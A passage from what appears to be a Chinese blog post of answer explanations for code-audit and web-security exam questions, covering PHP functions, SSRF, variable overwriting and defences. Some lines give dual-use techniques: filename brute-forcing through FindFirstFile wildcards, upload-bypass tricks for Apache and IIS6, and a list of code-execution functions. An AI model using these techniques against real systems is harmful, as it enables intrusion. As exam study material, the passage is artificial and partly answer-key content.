invoke__">error_reporting</span>(?<span class="keyword">int</span> <span class="variable">$error_level</span> = <span class="literal">null</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report simple running errors</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// E_NOTICE是运行时的通知，显示基础提示信息</span></span><br><span class="line"><span class="comment">// E_PARSE是编译时的错误</span></span><br><span class="line"><span class="comment">// E_WARNING是运行时非致命的错误</span></span><br><span class="line"><span class="comment">// E_ERROR是运行时致命的错误</span></span><br><span class="line"><span class="comment">// (报告未初始化的变量或者捕获变量名的错误拼写)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了 E_NOTICE，报告其他所有错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 error_reporting(E_ALL); 一样</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-error-reporting.html">error_reporting</a></p><h2 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用，这对于一体式的文件函数非常有用，类似于readfile(),file(),file_get_contents()，在数据流内容读取之前没有机会应用其它过滤器。<br><code>php://filter</code> 目标使用以下参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了要筛选过滤的参数</span><br><span class="line">read=&lt;读链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选链表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;; 两个链的筛选列表&gt;任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></p><h2 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h2><h3 id="MySQL常用报错函数"><a href="#MySQL常用报错函数" class="headerlink" title="MySQL常用报错函数"></a>MySQL常用报错函数</h3><p><a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">看这篇博客即可</a></p><h3 id="htmlspeicalchars-函数"><a href="#htmlspeicalchars-函数" class="headerlink" title="htmlspeicalchars()函数"></a>htmlspeicalchars()函数</h3><p>将特殊字符转换为HTML实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span></span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><ul><li><p>参数<br>string 待转换的string<br>flags  位掩码<br>encoding 一个可选参数，定义转换字符时使用的编码<br>double_encode 关闭double_encode时，PHP不会转换现有的HTML实体，默认是全部转换。</p></li><li><p>返回值<br>转换后的string</p></li></ul><p><a href="https://www.php.net/manual/zh/function.htmlspecialchars">htmlspeicalchars</a></p><h2 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h2><h3 id="FindFirstFile-函数"><a href="#FindFirstFile-函数" class="headerlink" title="FindFirstFile()函数"></a>FindFirstFile()函数</h3><p>根据文件名查找文件。该函数到一个文件夹(包括子文件夹)去搜索指定文件 如果要使用附加属性去搜索文件的话 可以使用FindFirstFileEx函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE WINAPI <span class="title function_ invoke__">FindFirstFile</span>(</span><br><span class="line">_In_   LPCTSTR lpFileName,</span><br><span class="line">_Out_  LPWIN32_FIND_DATA lpFindFileData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><p>参数<br>IpFileName 用于指定搜索目录和文件类型，可以用通配符，初次使用注意需要用转义字符（\）表达<br>IpFindFileData 用于保存搜索得到的文件信息。</p></li><li><p>返回值<br>返回HANDLE类型，为下一次搜索提供信息。当搜索失败时，返回INVALID_HANDLE_VALUE</p></li><li><p>利用方法<br>将文件名不可知部分之后的字符串用“&lt;”或“&gt;”代替即可。需要注意，只使用一个“&lt;”或“&gt;”则只能代表一个字符。如果文件名是12345或更长，这时候请求“1&lt;”或“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，可通过该方式爆破目录文件。</p></li></ul><h2 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h2><h3 id="escapeshellarg-函数"><a href="#escapeshellarg-函数" class="headerlink" title="escapeshellarg()函数"></a>escapeshellarg()函数</h3><p>把字符串转义为可以在shell命令里使用的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellarg</span>(<span class="keyword">string</span> <span class="variable">$arg</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。<br>在 Windows 上，escapeshellarg() 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线()都会被一个额外的反斜线所转义。</p><ul><li>返回值<br>转换之后的字符串<br><a href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></li></ul><h3 id="strip-tags-函数"><a href="#strip-tags-函数" class="headerlink" title="strip_tags()函数"></a>strip_tags()函数</h3><p>从字符串中去除HTML和PHP标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string $string, array|string|null $allowed_tags = null): string</span><br></pre></td></tr></table></figure><ul><li>参数<br>allowed_tags,使用可选的第二个参数指定不被去除的标签列表。要么是 string，要么自 PHP 7.4.0 起是 array。</li><li>返回值<br>返回处理后的字符串<br><a href="https://www.php.net/manual/zh/function.strip-tags">strip_tags</a></li></ul><h3 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h3><p>使用反斜线引用字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="keyword">string</span> <span class="variable">$string</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>返回需要在转义字符之前添加反斜线的字符串。这些字符是：<br>单引号（’）<br>双引号（”）<br>反斜线（\）<br>NUL（NUL 字节）</p><p><a href="https://www.php.net/manual/zh/function.addslashes">addslashes</a></p><h3 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string()函数"></a>mysql_real_escape_string()函数</h3><p>转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集<br>警告：本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="keyword">string</span> <span class="variable">$unescaped_string</span>, resource <span class="variable">$link_identifier</span> = <span class="literal">NULL</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.mysql-real-escape-string">mysql_real_escape_string</a></p><h2 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h2><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><p>RSA算法，DSA算法，ECC算法，DH算法，SM2算法</p><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>AES算法，DES算法，3DES算法，RC算法，SM1算法</p><h2 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h2><p>验证码更多放在会话（Session）中</p><h2 id="第10题"><a href="#第10题" class="headerlink" title="第10题"></a>第10题</h2><p>预防撞库攻击的方式：</p><ul><li>强制用户密码的强度。</li><li>定期强制用户更换密码</li><li>在账户相关接口加强人机防控策略</li><li>重要业务流程采用二次验证</li><li>建立业务维度的账号异常指标监控，并及时处理风险账号</li><li>借助安全工具做好防撞库攻击</li></ul><h2 id="第11题"><a href="#第11题" class="headerlink" title="第11题"></a>第11题</h2><h3 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h3><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h2 id="第12题"><a href="#第12题" class="headerlink" title="第12题"></a>第12题</h2><p>充值支付漏洞的主要应对方法：<br>后端检查每一项值，包括支付状态。商品单价及总价不能从客户端获取。<br>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量不能超过65535。<br>与第三方支付平台检查，实际支付的金额是否与订单金额一致。<br>如果给用户退款，要使用原路、原订单退回。<br>支付参数进行 MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题。<br>金额超过阈值，进行人工审核</p><h2 id="第13题"><a href="#第13题" class="headerlink" title="第13题"></a>第13题</h2><h3 id="iconv-函数"><a href="#iconv-函数" class="headerlink" title="iconv()函数"></a>iconv()函数</h3><p>字符串按要求的字符编码来转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv(string $in_charset, string $out_charset, string $str): string</span><br></pre></td></tr></table></figure><p>将字符串 str 从 in_charset 转换编码到 out_charset。</p><ul><li>参数<br>in_charset,输入的字符集。<br>out_charset,输出的字符集。<br>str,要转换的字符串</li><li>返回值<br>返回转换后的字符串，或者在失败后返回false<br><a href="https://www.php.net/manual/zh/function.iconv">iconv</a></li></ul><h2 id="第14题"><a href="#第14题" class="headerlink" title="第14题"></a>第14题</h2><h3 id="is-null-函数"><a href="#is-null-函数" class="headerlink" title="is_null()函数"></a>is_null()函数</h3><p>检测变量是否为null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_null</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><ul><li>返回值<br>如果value为null，返回true，否则返回false</li></ul><h2 id="第15题"><a href="#第15题" class="headerlink" title="第15题"></a>第15题</h2><h3 id="PHP禁用函数"><a href="#PHP禁用函数" class="headerlink" title="PHP禁用函数"></a>PHP禁用函数</h3><p>PHP禁用函数的方法：首先打开“php.ini”配置文件；然后查找字符“disable_functions”，该字符是PHP禁用函数的配置项；接着在该配置项加上需要禁用的函数，多个函数用英文逗号分隔；最后保存重启即可。</p><h2 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h2><h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>文件包含过程中出现错误，抛出错误，退出程序执行</p><h2 id="第17题"><a href="#第17题" class="headerlink" title="第17题"></a>第17题</h2><h3 id="unlink-函数"><a href="#unlink-函数" class="headerlink" title="unlink()函数"></a>unlink()函数</h3><p>删除文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。</p><ul><li>参数<br>filename,文件的路径。如果文件是符号链接，将会删除符号链接。在Windows上，删除目录的符号链接，必须使用rmdir()<br>context,上下文流（context stream）resource</li><li>返回值<br>成功时返回true，或在失败时返回false</li></ul><h2 id="第18题"><a href="#第18题" class="headerlink" title="第18题"></a>第18题</h2><h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h3><p>执行外部程序，并且显示输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>本函数执行 command 参数所指定的命令，并且输出执行结果。<br>如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。<br>如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</p><ul><li>返回值<br>成功则返回命令输出的最后一行，失败则返回false</li></ul><h2 id="第19题"><a href="#第19题" class="headerlink" title="第19题"></a>第19题</h2><h3 id="绝对等于-x3D-x3D-x3D"><a href="#绝对等于-x3D-x3D-x3D" class="headerlink" title="绝对等于(&#x3D;&#x3D;&#x3D;)"></a>绝对等于(&#x3D;&#x3D;&#x3D;)</h3><p>如果x等于y，且它们类型相同，则返回true。比较时不做类型转换</p><h2 id="第20题"><a href="#第20题" class="headerlink" title="第20题"></a>第20题</h2><h3 id="程序目录结构"><a href="#程序目录结构" class="headerlink" title="程序目录结构"></a>程序目录结构</h3><ol><li>函数集文件，通常命名中包含functions或common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其它文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li><li>配置文件，通常命名中包括config关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用双引号括起来，如果是双引号，则很可能会存在代码执行漏洞。</li><li>安全过滤文件，安全过滤文件对我们做代码审计至关重要，关系到我们挖掘到的可疑点能不能利用，通常命名中有filter、safe、check等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数，其他的则相对少见。而目前大多数应用都会在程序的入口循环对所有参数使用addslashes()函数进行过滤。</li><li>index文件，index是一个程序的入口文件，所以通常我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件又有哪些。而不同目录的index文件也有不同的实现方式，建议最好先将几个核心目录的index文件都简单读一遍。</li></ol><h2 id="第21题"><a href="#第21题" class="headerlink" title="第21题"></a>第21题</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞在代码审计的时候，最快的方法就是直接去搜索 <code>move_uploaded_file()</code> 函数，再去看调用这个函数上传文件的代码存不存在未限制上传格式或者可以绕过，其中问题比较多的是黑名单限制文件格式以及未更改文件名的方式，没有更改文件名的情况下，在Apache利用其向前寻找解析格式和IIS6的分号解析bug都可以执行代码。</p><h2 id="第22题"><a href="#第22题" class="headerlink" title="第22题"></a>第22题</h2><h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h3><p>执行一个正则表达式的搜索和替换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>搜素subject中匹配pattern的部分，以replacement进行替换。</p><ul><li><p>参数<br>pattern,要搜索的模式。可以是一个字符串或字符串数组。<br>replacement,用于替换的字符串或字符串数组。<br>subject,要进行搜索和替换的字符串或字符串数组。<br>limit,每个模式在每个subject上进行替换的最大次数。默认是-1(无限)<br>count,如果指定，将会被填充为完成的替换次数。</p></li><li><p>返回值<br>如果subject是一个数组，preg_replace()返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 null 。</p></li></ul><p><a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace</a></p><h2 id="第23题"><a href="#第23题" class="headerlink" title="第23题"></a>第23题</h2><p>函数escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，把双引号替换为空格。<br>详细见<strong>第7题</strong>的内容</p><h2 id="第24题"><a href="#第24题" class="headerlink" title="第24题"></a>第24题</h2><p><code>import_request_variables()</code> 函数作用是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP 4.1至5.4之间的版本，不过建议是不开启register_globals也不要使用import_request_variables()函数，这样容易导致变量覆盖。</p><h2 id="第25题"><a href="#第25题" class="headerlink" title="第25题"></a>第25题</h2><p>常见的代码审计思路：<br>1）根据敏感关键字回溯参数传递过程。 2）查找可控变量，正向追踪变量传递过程。 3）寻找敏感功能点，通读功能点代码。</p><h2 id="第26题"><a href="#第26题" class="headerlink" title="第26题"></a>第26题</h2><p>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞叫做二次漏洞。</p><h1 id="第2套试题"><a href="#第2套试题" class="headerlink" title="第2套试题"></a>第2套试题</h1><h2 id="第1题-1"><a href="#第1题-1" class="headerlink" title="第1题"></a>第1题</h2><h3 id="全局变量注册开关"><a href="#全局变量注册开关" class="headerlink" title="全局变量注册开关"></a>全局变量注册开关</h3><p>register_globals即全局注册变量开关，register_globals是php.ini文件里面的一个安全设置选项。<br>当选项关闭的时候，PHP使用$_GET,$_POST,$_COOKIE或$_SESSION等数组来接收客户端传递过来的参数；<br>当选项开启的时候，客户端传过来的参数会被直接注册为全局变量来使用。</p><h3 id="allow-url-include参数（只影响RFI，不影响LFI）"><a href="#allow-url-include参数（只影响RFI，不影响LFI）" class="headerlink" title="allow_url_include参数（只影响RFI，不影响LFI）"></a>allow_url_include参数（只影响RFI，不影响LFI）</h3><p>是否允许include()和require()函数包含URL（HTTP，HTTPS）作为文件处理</p><h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p>默认情况下，PHP 指令 magic_quotes_gpc 为 on，它主要是对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes ()。 不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes ()，因为这样会导致双层转义。 遇到这种情况时可以使用函数 get_magic_quotes_gpc () 进行检测。</p><h3 id="magic-quotes-runtime"><a href="#magic-quotes-runtime" class="headerlink" title="magic_quotes_runtime"></a>magic_quotes_runtime</h3><p>在php.ini的配置文件中，有个布尔值的设置，就是magic_quotes_runtime,当它打开时，php的大部分函数自动的给从外部引入的 (包括数据库或者文件)数据中的溢出字符加上反斜线。 当然如果重复给溢出字符加反斜线，那么字符串中就会有多个反斜线，所以这时就要用set_magic_quotes_runtime ()与 get_magic_quotes_runtime ()设置和检测php.ini文件中magic_quotes_runtime状态。</p><h2 id="第2题-1"><a href="#第2题-1" class="headerlink" title="第2题"></a>第2题</h2><p>参考第1套试题的第8题。</p><h2 id="第3题-1"><a href="#第3题-1" class="headerlink" title="第3题"></a>第3题</h2><p>常用验证码类型：</p><ol><li>数字、字母、中文组合</li><li>图片识别</li><li>滑动验证</li><li>短信&#x2F;邮箱&#x2F;电话验证</li><li>语音验证<br>本题属于题目有误，无正确答案</li></ol><h2 id="第4题-1"><a href="#第4题-1" class="headerlink" title="第4题"></a>第4题</h2><h3 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h3><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数</p><ul><li>参数<br>callback,将被调用的回调函数<br>args,0个或以上的参数，被传入回调函数</li></ul><h3 id="可能造成代码执行漏洞的函数"><a href="#可能造成代码执行漏洞的函数" class="headerlink" title="可能造成代码执行漏洞的函数"></a>可能造成代码执行漏洞的函数</h3><p>system, exec, shell_exec, passthru, eval, assert, preg_replace, call_user_func</p><h2 id="第5题-1"><a href="#第5题-1" class="headerlink" title="第5题"></a>第5题</h2><p>命令执行漏洞的防御：</p><ol><li>使用自定义函数或者函数库来代替外部命令的功能。</li><li>使用escapeshellarg函数来处理命令参数</li><li>使用safe_mode_exec_dir指定可执行文件的命令</li><li>使用白名单对可包含文件进行限制</li><li>严格检查include类的文件包含函数中的参数是否外界可控。</li></ol><h2 id="第6题-1"><a href="#第6题-1" class="headerlink" title="第6题"></a>第6题</h2><p>变量覆盖常用函数或方式：</p><ol><li>register_global注册开关</li><li>extract()</li><li>$$符号（可变变量）</li><li>import_request_variables()</li><li>parse_str()<br><a href="https://y4er.com/posts/variable-coverage/#import_request_variables">变量覆盖</a></li></ol><h2 id="第7题-1"><a href="#第7题-1" class="headerlink" title="第7题"></a>第7题</h2><p>王小云对MD5算法的碰撞问题研究方面做出了贡献。</p><h2 id="第8题-1"><a href="#第8题-1" class="headerlink" title="第8题"></a>第8题</h2><p>A选项设计思路不可行</p><h2 id="第9题-1"><a href="#第9题-1" class="headerlink" title="第9题"></a>第9题</h2><p>为了防止客户端可修改价格，那么单价和总价不可从客户端获取<br>为了防止数量出现漏洞，需要验证购买数量不能小于等于0<br>为了防止利用时间差多次购买，进行账户支付锁定机制</p><h2 id="第10题-1"><a href="#第10题-1" class="headerlink" title="第10题"></a>第10题</h2><p>一个文件管理功能为了保证安全，在满足业务需求的情况下，设计的时候应该遵循以下几个点：</p><ol><li>禁止写入脚本可在服务器端执行的文件</li><li>限制文件管理功能操作的目录</li><li>限制文件管理功能访问权限</li><li>禁止上传特殊字符文件名的文件</li></ol><h2 id="第11题-1"><a href="#第11题-1" class="headerlink" title="第11题"></a>第11题</h2><p>通常文件和数据库备份功能容易出现的安全问题包括：</p><ol><li>备份文件名可预测</li><li>未授权访问和越权访问</li><li>可以直接执行SQL语句进行操作</li></ol><h2 id="第12题-1"><a href="#第12题-1" class="headerlink" title="第12题"></a>第12题</h2><p>密码策略应当遵守的原则：</p><ol><li>禁止使用弱口令</li><li>禁止用户名和密码相同</li><li>强制密码使用8位以上的“大小写字母+数字+特殊字符”的组合</li></ol><h2 id="第13题-1"><a href="#第13题-1" class="headerlink" title="第13题"></a>第13题</h2><p>双因素认证是一种采用时间同步技术的系统，每次产生的动态密码不同。<br>独立密码是区别于登陆密码的二次加密保护，大多时候不能进行登录保护<br>实现登录保护的策略：双因素认证，动态令牌，限制登录IP</p><h2 id="第14题-1"><a href="#第14题-1" class="headerlink" title="第14题"></a>第14题</h2><p>用户注册有以下几个安全思路：<br>1）设计验证码。2）采集用户机器唯一识别码，拦截短时间多次注册。3）根据账号格式自学习识别垃圾账号。4）防止SQL注入漏洞与XSS漏洞</p><h2 id="第15题-1"><a href="#第15题-1" class="headerlink" title="第15题"></a>第15题</h2><p>多因素认证的方式有如下几种：</p><ol><li>手机短信&#x2F;语音验证码</li><li>手机App动态令牌</li><li>邮箱验证码</li><li>实体令牌卡</li><li>电子图片令牌卡</li><li>硬件令牌</li></ol><h2 id="第21题-1"><a href="#第21题-1" class="headerlink" title="第21题"></a>第21题</h2><p>代码审计是对应用程序源代码进行检查，目的是为了找到并且修复应用程序在开发阶段存在的一些漏洞或者程序逻辑错误，避免程序漏洞被非法利用。</p><h2 id="第22题-1"><a href="#第22题-1" class="headerlink" title="第22题"></a>第22题</h2><p>文件操作漏洞中的文件包含又分为本地文件包含和远程文件包含。</p><h2 id="第23题-1"><a href="#第23题-1" class="headerlink" title="第23题"></a>第23题</h2><p>代码执行漏洞是指应用程序本身过滤不严。</p><h2 id="第24题-1"><a href="#第24题-1" class="headerlink" title="第24题"></a>第24题</h2><p>SQL注入过滤函数有addslashes()函数，mysql_real_escape_string()函数，mysql_escape_string()函数。XSS过滤函数有htmlspecialchars()和strip_tags()。</p><h2 id="第25题-1"><a href="#第25题-1" class="headerlink" title="第25题"></a>第25题</h2><p>加密是指将明文以特定的方式进行混淆，直接可见的数据以特定的算法进行混淆。</p><h2 id="第26题-1"><a href="#第26题-1" class="headerlink" title="第26题"></a>第26题</h2><p>一个网站的应用安全防御应该包括对输入的特殊字符过滤、输出过滤、异常访问检测、自身安全检测，等等。</p><h2 id="第27题"><a href="#第27题" class="headerlink" title="第27题"></a>第27题</h2><p>自身安全检测方式有：木马查杀、弱后台地址检测、弱口令检测，等等。</p><h2 id="第28题"><a href="#第28题" class="headerlink" title="第28题"></a>第28题</h2><p>将数据复制到不足以容纳数据的缓冲区，会导致缓冲区溢出。</p><h2 id="第29题"><a href="#第29题" class="headerlink" title="第29题"></a>第29题</h2><p>UTF-8是一个8位字符集，它可以表示Unicode字符集中的每个字符，而且与美国7位ASCII字符集向后兼容。每个UTF-8字符由1~4个字符表示。</p><h2 id="第30题"><a href="#第30题" class="headerlink" title="第30题"></a>第30题</h2><p>在C和C++中，操作字符串最常见的错误有4种，分别是无界字符串复制(unbounded string copy)、差一错误(off-by-one error)、空结尾错误(null termination error)以及字符串截断(string truncation)。</p><h2 id="第31题"><a href="#第31题" class="headerlink" title="第31题"></a>第31题</h2><p>测试包括：白盒测试，黑盒测试，灰盒测试。<br>黑盒测试又叫功能测试，是指在不接触代码的情况下，测试系统的功能是否存在bug，是否满足设计需求。<br>而白盒测试就是我们说的代码审计，以开放的形式从代码层面寻找bug，如果发现有bug则返回修复，直到没有bug才允许软件发布上线</p><h2 id="第32题"><a href="#第32题" class="headerlink" title="第32题"></a>第32题</h2><p>magic_quotes_gpc负责对GET,POST,COOKIE的值进行过滤。</p><h2 id="第33题"><a href="#第33题" class="headerlink" 